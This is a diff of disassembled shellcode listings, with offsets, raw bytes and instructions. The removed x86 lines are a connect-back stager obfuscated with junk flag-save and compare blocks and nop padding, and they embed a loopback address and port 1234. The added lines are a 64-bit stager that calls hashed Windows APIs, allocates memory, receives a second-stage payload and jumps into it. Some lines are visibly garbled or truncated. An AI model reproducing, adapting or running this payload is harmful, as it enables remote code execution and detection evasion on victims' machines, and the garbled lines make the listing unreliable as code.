+0x1e6 bytearray(b'\x90') 1  nop  
+0x1e7 bytearray(b'\x90') 1  nop  
+0x1e8 bytearray(b'\x90') 1  nop  
+0x1e9 bytearray(b'\x90') 1  nop  
+0x1ea bytearray(b'\x90') 1  nop  
+0x1eb bytearray(b'\x90') 1  nop  
+0x1ec bytearray(b'\x90') 1  nop  
 0x1ed bytearray(b'\x90') 1  nop  
 0x1ee bytearray(b'\x90') 1  nop  
-0x1ef bytearray(b'\xff\xd5') 2  call  ebp
-0x1f1 bytearray(b'\xb8\x90\x01\x00\x00') 5  mov  eax, 0x190
-0x1f6 bytearray(b')\xc4') 2  sub  esp, eax
-0x1f8 bytearray(b'T') 1  push  esp
-0x1f9 bytearray(b'P') 1  push  eax
-0x1fa bytearray(b'h)\x80k\x00') 5  push  0x6b8029
-0x1ff bytearray(b'\x9c') 1  pushfd  
-0x200 bytearray(b'P') 1  push  eax
-0x201 bytearray(b'\xb8\xdb\x00\x00\x00') 5  mov  eax, 0xdb
-0x206 bytearray(b'\x83\xc0\x00') 3  add  eax, 0
-0x209 bytearray(b'=\xdb\x00\x00\x00') 5  cmp  eax, 0xdb
-0x20e bytearray(b'X') 1  pop  eax
-0x20f bytearray(b'\x9d') 1  popfd  
-0x210 bytearray(b't\x05') 2  je  0x217
+0x1ef bytearray(b'\x90') 1  nop  
+0x1f0 bytearray(b'\x90') 1  nop  
+0x1f1 bytearray(b'\x90') 1  nop  
+0x1f2 bytearray(b'\x90') 1  nop  
+0x1f3 bytearray(b'\x90') 1  nop  
+0x1f4 bytearray(b'\x90') 1  nop  
+0x1f5 bytearray(b'\x90') 1  nop  
+0x1f6 bytearray(b'\x90') 1  nop  
+0x1f7 bytearray(b'\x90') 1  nop  
+0x1f8 bytearray(b'\x90') 1  nop  
+0x1f9 bytearray(b'\x90') 1  nop  
+0x1fa bytearray(b'\x90') 1  nop  
+0x1fb bytearray(b'\x90') 1  nop  
+0x1fc bytearray(b'\x90') 1  nop  
+0x1fd bytearray(b'\x90') 1  nop  
+0x1fe bytearray(b'\x90') 1  nop  
+0x1ff bytearray(b'\x90') 1  nop  
+0x200 bytearray(b'\x90') 1  nop  
+0x201 bytearray(b'\x90') 1  nop  
+0x202 bytearray(b'\x90') 1  nop  
+0x203 bytearray(b'\x90') 1  nop  
+0x204 bytearray(b'\x90') 1  nop  
+0x205 bytearray(b'\x90') 1  nop  
+0x206 bytearray(b'\x90') 1  nop  
+0x207 bytearray(b'\x90') 1  nop  
+0x208 bytearray(b'\x90') 1  nop  
+0x209 bytearray(b'\x90') 1  nop  
+0x20a bytearray(b'\x90') 1  nop  
+0x20b bytearray(b'\x90') 1  nop  
+0x20c bytearray(b'\x90') 1  nop  
+0x20d bytearray(b'\x90') 1  nop  
+0x20e bytearray(b'\x90') 1  nop  
+0x20f bytearray(b'\x90') 1  nop  
+0x210 bytearray(b'\x90') 1  nop  
+0x211 bytearray(b'\x90') 1  nop  
 0x212 bytearray(b'\x90') 1  nop  
 0x213 bytearray(b'\x90') 1  nop  
 0x214 bytearray(b'\x90') 1  nop  
 0x215 bytearray(b'\x90') 1  nop  
 0x216 bytearray(b'\x90') 1  nop  
-0x217 bytearray(b'\xff\xd5') 2  call  ebp
-0x219 bytearray(b'P') 1  push  eax
-0x21a bytearray(b'P') 1  push  eax
-0x21b bytearray(b'P') 1  push  eax
-0x21c bytearray(b'\x9c') 1  pushfd  
-0x21d bytearray(b'W') 1  push  edi
-0x21e bytearray(b'\xbf\xac\x00\x00\x00') 5  mov  edi, 0xac
-0x223 bytearray(b'\x81\xff\xac\x00\x00\x00') 6  cmp  edi, 0xac
-0x229 bytearray(b'_') 1  pop  edi
-0x22a bytearray(b'\x9d') 1  popfd  
-0x22b bytearray(b't\x04') 2  je  0x231
+0x217 bytearray(b'\x90') 1  nop  
+0x218 bytearray(b'\x90') 1  nop  
+0x219 bytearray(b'\x90') 1  nop  
+0x21a bytearray(b'\x90') 1  nop  
+0x21b bytearray(b'\x90') 1  nop  
+0x21c bytearray(b'\x90') 1  nop  
+0x21d bytearray(b'\x90') 1  nop  
+0x21e bytearray(b'\x90') 1  nop  
+0x21f bytearray(b'\x90') 1  nop  
+0x220 bytearray(b'\x90') 1  nop  
+0x221 bytearray(b'\x90') 1  nop  
+0x222 bytearray(b'\x90') 1  nop  
+0x223 bytearray(b'\x90') 1  nop  
+0x224 bytearray(b'\x90') 1  nop  
+0x225 bytearray(b'\x90') 1  nop  
+0x226 bytearray(b'\x90') 1  nop  
+0x227 bytearray(b'\x90') 1  nop  
+0x228 bytearray(b'\x90') 1  nop  
+0x229 bytearray(b'\x90') 1  nop  
+0x22a bytearray(b'\x90') 1  nop  
+0x22b bytearray(b'\x90') 1  nop  
+0x22c bytearray(b'\x90') 1  nop  
 0x22d bytearray(b'\x90') 1  nop  
 0x22e bytearray(b'\x90') 1  nop  
 0x22f bytearray(b'\x90') 1  nop  
 0x230 bytearray(b'\x90') 1  nop  
-0x231 bytearray(b'P') 1  push  eax
-0x232 bytearray(b'\x83\xc0\x01') 3  add  eax, 1
-0x235 bytearray(b'P') 1  push  eax
-0x236 bytearray(b'\x9c') 1  pushfd  
-0x237 bytearray(b'V') 1  push  esi
-0x238 bytearray(b'\xbe\xb7\x00\x00\x00') 5  mov  esi, 0xb7
-0x23d bytearray(b'\x85\xf6') 2  test  esi, esi
-0x23f bytearray(b'^') 1  pop  esi
-0x240 bytearray(b'\x9d') 1  popfd  
-0x241 bytearray(b't\x05') 2  je  0x248
-0x243 bytearray(b'\x90') 1  nop  
-0x244 bytearray(b'\x90') 1  nop  
-0x245 bytearray(b'\x90') 1  nop  
-0x246 bytearray(b'\x90') 1  nop  
-0x247 bytearray(b'\x90') 1  nop  
-0x248 bytearray(b'@') 1  inc  eax
-0x249 bytearray(b'P') 1  push  eax
-0x24a bytearray(b'\x9c') 1  pushfd  
-0x24b bytearray(b'P') 1  push  eax
-0x24c bytearray(b'\xb8\x1f\x00\x00\x00') 5  mov  eax, 0x1f
-0x251 bytearray(b'\x83\xc0\x00') 3  add  eax, 0
-0x254 bytearray(b'\x83\xf8\x1f') 3  cmp  eax, 0x1f
-0x257 bytearray(b'X') 1  pop  eax
-0x258 bytearray(b'\x9d') 1  popfd  
-0x259 bytearray(b't\x13') 2  je  0x26e
-0x25b bytearray(b'\x90') 1  nop  
-0x25c bytearray(b'\x90') 1  nop  
-0x25d bytearray(b'\x90') 1  nop  
-0x25e bytearray(b'\x90') 1  nop  
-0x25f bytearray(b'\x9c') 1  pushfd  
-0x260 bytearray(b'W') 1  push  edi
-0x261 bytearray(b'\xbf&\x00\x00\x00') 5  mov  edi, 0x26
-0x266 bytearray(b'\x85\xff') 2  test  edi, edi
-0x268 bytearray(b'_') 1  pop  edi
-0x269 bytearray(b'\x9d') 1  popfd  
-0x26a bytearray(b't\x02') 2  je  0x26e
-0x26c bytearray(b'\x90') 1  nop  
-0x26d bytearray(b'\x90') 1  nop  
-0x26e bytearray(b'h\xea\x0f\xdf\xe0') 5  push  0xe0df0fea
-0x273 bytearray(b'\x9c') 1  pushfd  
-0x274 bytearray(b'Q') 1  push  ecx
-0x275 bytearray(b'\xb9\xce\x00\x00\x00') 5  mov  ecx, 0xce
-0x27a bytearray(b'\x83\xc1\x00') 3  add  ecx, 0
-0x27d bytearray(b'\x81\xf9\xce\x00\x00\x00') 6  cmp  ecx, 0xce
-0x283 bytearray(b'Y') 1  pop  ecx
-0x284 bytearray(b'\x9d') 1  popfd  
-0x285 bytearray(b't\x03') 2  je  0x28a
-0x287 bytearray(b'\x90') 1  nop  
-0x288 bytearray(b'\x90') 1  nop  
-0x289 bytearray(b'\x90') 1  nop  
-0x28a bytearray(b'\xff\xd5') 2  call  ebp
-0x28c bytearray(b'\x9c') 1  pushfd  
-0x28d bytearray(b'V') 1  push  esi
-0x28e bytearray(b'\xbe\xe7\x00\x00\x00') 5  mov  esi, 0xe7
-0x293 bytearray(b'\x8d6') 2  lea  esi, [esi]
-0x295 bytearray(b'\x81\xfe\xe7\x00\x00\x00') 6  cmp  esi, 0xe7
-0x29b bytearray(b'^') 1  pop  esi
-0x29c bytearray(b'\x9d') 1  popfd  
-0x29d bytearray(b't\x05') 2  je  0x2a4
-0x29f bytearray(b'\x90') 1  nop  
-0x2a0 bytearray(b'\x90') 1  nop  
-0x2a1 bytearray(b'\x90') 1  nop  
-0x2a2 bytearray(b'\x90') 1  nop  
-0x2a3 bytearray(b'\x90') 1  nop  
-0x2a4 bytearray(b'\x97') 1  xchg  edi, eax
-0x2a5 bytearray(b'\xe8\x1f\x00\x00\x00') 5  call  0x2c9
-0x2aa bytearray(b'12') 2  xor  dword ptr [edx], esi
-0x2ac bytearray(b'\x9c') 1  pushfd  
-0x2ad bytearray(b'P') 1  push  eax
-0x2ae bytearray(b'\xb8\xf6\x00\x00\x00') 5  mov  eax, 0xf6
-0x2b3 bytearray(b'=\xf6\x00\x00\x00') 5  cmp  eax, 0xf6
-0x2b8 bytearray(b'X') 1  pop  eax
-0x2b9 bytearray(b'\x9d') 1  popfd  
-0x2ba bytearray(b't\x05') 2  je  0x2c1
-0x2bc bytearray(b'\x90') 1  nop  
-0x2bd bytearray(b'\x90') 1  nop  
-0x2be bytearray(b'\x90') 1  nop  
-0x2bf bytearray(b'\x90') 1  nop  
-0x2c0 bytearray(b'\x90') 1  nop  
-0x2c1 bytearray(b'7') 1  aaa  
-0x2c2 bytearray(b'.0.') 3  xor  byte ptr cs:[esi], ch
-0x2c5 bytearray(b'0.') 2  xor  byte ptr [esi], ch
-0x2c7 bytearray(b'1\x00') 2  xor  dword ptr [eax], eax
-0x2c9 bytearray(b'h\xa9(4\x80') 5  push  0x803428a9
-0x2ce bytearray(b'\x9c') 1  pushfd  
-0x2cf bytearray(b'Q') 1  push  ecx
-0x2d0 bytearray(b'h\xfb\x00\x00\x00') 5  push  0xfb
-0x2d5 bytearray(b'Y') 1  pop  ecx
-0x2d6 bytearray(b'\x81\xf9\xfb\x00\x00\x00') 6  cmp  ecx, 0xfb
-0x2dc bytearray(b'Y') 1  pop  ecx
-0x2dd bytearray(b'\x9d') 1  popfd  
-0x2de bytearray(b't\x04') 2  je  0x2e4
-0x2e0 bytearray(b'\x90') 1  nop  
-0x2e1 bytearray(b'\x90') 1  nop  
-0x2e2 bytearray(b'\x90') 1  nop  
-0x2e3 bytearray(b'\x90') 1  nop  
-0x2e4 bytearray(b'\xff\xd5') 2  call  ebp
-0x2e6 bytearray(b'\x8b@\x1c') 3  mov  eax, dword ptr [eax + 0x1c]
-0x2e9 bytearray(b'\x9c') 1  pushfd  
-0x2ea bytearray(b'R') 1  push  edx
-0x2eb bytearray(b'1\xd2') 2  xor  edx, edx
-0x2ed bytearray(b'\x83\xfa\x00') 3  cmp  edx, 0
-0x2f0 bytearray(b'Z') 1  pop  edx
-0x2f1 bytearray(b'\x9d') 1  popfd  
-0x2f2 bytearray(b't\x1c') 2  je  0x310
-0x2f4 bytearray(b'\x90') 1  nop  
-0x2f5 bytearray(b'\x90') 1  nop  
-0x2f6 bytearray(b'\x90') 1  nop  
-0x2f7 bytearray(b'\x90') 1  nop  
-0x2f8 bytearray(b'\x90') 1  nop  
-0x2f9 bytearray(b'\x9c') 1  pushfd  
-0x2fa bytearray(b'V') 1  push  esi
-0x2fb bytearray(b'\xbe\xf3\x00\x00\x00') 5  mov  esi, 0xf3
-0x300 bytearray(b'\xf7\xde') 2  neg  esi
-0x302 bytearray(b'\xf7\xde') 2  neg  esi
-0x304 bytearray(b'\x81\xfe\xf3\x00\x00\x00') 6  cmp  esi, 0xf3
-0x30a bytearray(b'^') 1  pop  esi
-0x30b bytearray(b'\x9d') 1  popfd  
-0x30c bytearray(b't\x02') 2  je  0x310
-0x30e bytearray(b'\x90') 1  nop  
-0x30f bytearray(b'\x90') 1  nop  
-0x310 bytearray(b'j\n') 2  push  0xa
-0x312 bytearray(b'P') 1  push  eax
-0x313 bytearray(b'h\x02\x00\x04\xd2') 5  push  0xd2040002
-0x318 bytearray(b'\x89\xe6') 2  mov  esi, esp
-0x31a bytearray(b'j\x10') 2  push  0x10
-0x31c bytearray(b'\x9c') 1  pushfd  
-0x31d bytearray(b'P') 1  push  eax
-0x31e bytearray(b'\xb8\xd8\x00\x00\x00') 5  mov  eax, 0xd8
-0x323 bytearray(b'\x8d\x00') 2  lea  eax, [eax]
-0x325 bytearray(b'=\xd8\x00\x00\x00') 5  cmp  eax, 0xd8
-0x32a bytearray(b'X') 1  pop  eax
-0x32b bytearray(b'\x9d') 1  popfd  
-0x32c bytearray(b't\x1b') 2  je  0x349
-0x32e bytearray(b'\x90') 1  nop  
-0x32f bytearray(b'\x90') 1  nop  
-0x330 bytearray(b'\x90') 1  nop  
-0x331 bytearray(b'\x90') 1  nop  
-0x332 bytearray(b'\x90') 1  nop  
+0x231 bytearray(b'\x90') 1  nop  
+0x232 bytearray(b'\x90') 1  nop  
+0x233 bytearray(b'\x90') 1  nop  
+0x234 bytearray(b'\x90') 1  nop  
+0x235 bytearray(b'\x90') 1  nop  
+0x236 bytearray(b'\x90') 1  nop  
+0x237 bytearray(b'\x90') 1  nop  
+0x238 bytearray(b'\x90') 1  nop  
+0x239 bytearray(b'\x90') 1  nop  
+0x23a bytearray(b'\x90') 1  nop  
+0x23b bytearray(b'\x90') 1  nop  
+0x23c bytearray(b'\x90') 1  nop  
+0x23d bytearray(b'\x90') 1  nop  
+0x23e bytearray(b'\x90') 1  nop  
+0x23f bytearray(b'\x90') 1  nop  
+0x240 bytearray(b'\x90') 1  nop  
+0x241 bytearray(b'\x90') 1  nop  
+0x242 bytearray(b'\x90') 1  nop  
+0x243 bytearray(b'H\x89\xc1') 3  mov  rcx, rax
+0x246 bytearray(b'S') 1  push  rbx
+0x247 bytearray(b'Z') 1  pop  rdx
+0x248 bytearray(b'AX') 2  pop  r8
+0x24a bytearray(b'M1\xc9') 3  xor  r9, r9
+0x24d bytearray(b'S') 1  push  rbx
+0x24e bytearray(b'H\xb8\x00\x02(\x84\x00\x00\x00\x00') 10  movabs  rax, 0x84280200
+0x258 bytearray(b'P') 1  push  rax
+0x259 bytearray(b'S') 1  push  rbx
+0x25a bytearray(b'S') 1  push  rbx
+0x25b bytearray(b'I\xc7\xc2\xebU.;') 7  mov  r10, 0x3b2e55eb
+0x262 bytearray(b'\xff\xd5') 2  call  rbp
+0x264 bytearray(b'H\x89\xc6') 3  mov  rsi, rax
+0x267 bytearray(b'j\n') 2  push  0xa
+0x269 bytearray(b'_') 1  pop  rdi
+0x26a bytearray(b'S') 1  push  rbx
+0x26b bytearray(b'Z') 1  pop  rdx
+0x26c bytearray(b'H\x89\xf1') 3  mov  rcx, rsi
+0x26f bytearray(b'M1\xc9') 3  xor  r9, r9
+0x272 bytearray(b'M1\xc9') 3  xor  r9, r9
+0x275 bytearray(b'S') 1  push  rbx
+0x276 bytearray(b'S') 1  push  rbx
+0x277 bytearray(b'I\xc7\xc2-\x06\x18{') 7  mov  r10, 0x7b18062d
+0x27e bytearray(b'\xff\xd5') 2  call  rbp
+0x280 bytearray(b'\x85\xc0') 2  test  eax, eax
+0x282 bytearray(b'\x0f\x85\x00\x00\x00\x00') 6  jne  0x288
+0x284 bytearray(b'H\xc7\xc1\x88\x13\x00\x00') 7  mov  rcx, 0x1388
+0x28b bytearray(b'I\xbaD\xf05\xe0\x00\x00\x00\x00') 10  movabs  r10, 0xe035f044
+0x295 bytearray(b'\xff\xd5') 2  call  rbp
+0x297 bytearray(b'H\xff\xcf') 3  dec  rdi
+0x29a bytearray(b'\x0f\x84\x00\x00\x00\x00') 6  je  0x2a0
+0x29c bytearray(b'\xe9\x00\x00\x00\x00') 5  jmp  0x2a1
+0x29e bytearray(b'\xe8U\x00\x00\x00') 5  call  0x2f8
+0x2a3 bytearray(b'S') 1  push  rbx
+0x2a4 bytearray(b'Y') 1  pop  rcx
+0x2a5 bytearray(b'j@') 2  push  0x40
+0x2a7 bytearray(b'Z') 1  pop  rdx
+0x2a8 bytearray(b'I\x89\xd1') 3  mov  r9, rdx
+0x2ab bytearray(b'\xc1\xe2\x10') 3  shl  edx, 0x10
+0x2ae bytearray(b'I\xc7\xc0\x00\x10\x00\x00') 7  mov  r8, 0x1000
+0x2b5 bytearray(b'I\xbaX\xa4S\xe5\x00\x00\x00\x00') 10  movabs  r10, 0xe553a458
+0x2bf bytearray(b'\xff\xd5') 2  call  rbp
+0x2c1 bytearray(b'H\x93') 2  xchg  rbx, rax
+0x2c3 bytearray(b'S') 1  push  rbx
+0x2c4 bytearray(b'S') 1  push  rbx
+0x2c5 bytearray(b'H\x89\xe7') 3  mov  rdi, rsp
+0x2c8 bytearray(b'H\x89\xf1') 3  mov  rcx, rsi
+0x2cb bytearray(b'H\x89\xda') 3  mov  rdx, rbx
+0x2ce bytearray(b'I\xc7\xc0\x00 \x00\x00') 7  mov  r8, 0x2000
+0x2d5 bytearray(b'I\x89\xf9') 3  mov  r9, rdi
+0x2d8 bytearray(b'I\xba\x12\x96\x89\xe2\x00\x00\x00\x00') 10  movabs  r10, 0xe2899612
+0x2e2 bytearray(b'\xff\xd5') 2  call  rbp
+0x2e4 bytearray(b'H\x83\xc4 ') 4  add  rsp, 0x20
+0x2e8 bytearray(b'\x85\xc0') 2  test  eax, eax
+0x2ea bytearray(b'\x0f\x84\x00\x00\x00\x00') 6  je  0x2f0
+0x2ec bytearray(b'f\x8b\x07') 3  mov  ax, word ptr [rdi]
+0x2ef bytearray(b'H\x01\xc3') 3  add  rbx, rax
+0x2f2 bytearray(b'\x85\xc0') 2  test  eax, eax
+0x2f4 bytearray(b'\x0f\x85\x00\x00\x00\x00') 6  jne  0x2fa
+0x2f6 bytearray(b'X') 1  pop  rax
+0x2f7 bytearray(b'\xc3') 1  ret  
+0x2f8 bytearray(b'X') 1  pop  rax
+0x2f9 bytearray(b'j\x00') 2  push  0
+0x2fb bytearray(b'Y') 1  pop  rcx
+0x2fc bytearray(b'I\xc7\xc2\xf0\xb5\xa2V') 7  mov  r10, 0x56a2b5f0
+0x303 bytearray(b'\xff\xd5') 2  call  rbp
+push  rbx
+0x309 bytearray(b'H\x89\xe7') 3  mov  rdi, rsp
+0x30c bytearray(b'H\x89\xf1') 3  mov  rcx, rsi
+0x30f bytearray(b'I\x89\xc0') 3  mov  r8, rax
+0x312 bytearray(b'H\x89\xda') 3  mov  rdx, rbx
+0x315 bytearray(b'I\x89\xf9') 3  mov  r9, rdi
+0x318 bytearray(b'I\xba\x12\x96\x89\xe2\x00\x00\x00\x00') 10  movabs  r10, 0xe2899612
+0x322 bytearray(b'\xff\xd5') 2  call  rbp
+0x324 bytearray(b'H\x83\xc4 ') 4  add  rsp, 0x20
+0x328 bytearray(b'\x85\xc0') 2  test  eax, eax
+0x32a bytearray(b'\x0f\x84\x90\xff\xff\xff') 6  je  0x2c0
+0x330 bytearray(b'X') 1  pop  rax
+0x331 bytearray(b'\xc3') 1  ret  
+0x332 bytearray(b'X') 1  pop  rax
+0x333 bytearray(b'j\x00') 2  push  0
+0x335 bytearray(b'Y') 1  pop  rcx
+0x336 bytearray(b'I\xc7\xc2\xf0\xb5\xa2V') 7  mov  r10, 0x56a2b5f0
+0x33d bytearray(b'\xff\xd5') 2  call  rbp
+rray(b'\x90') 1  nop  
 0x333 bytearray(b'\x9c') 1  pushfd  
 0x334 bytearray(b'V') 1  push  esi
 0x335 bytearray(b'\xbe`\x00\x00\x00') 5  mov  esi, 0x60
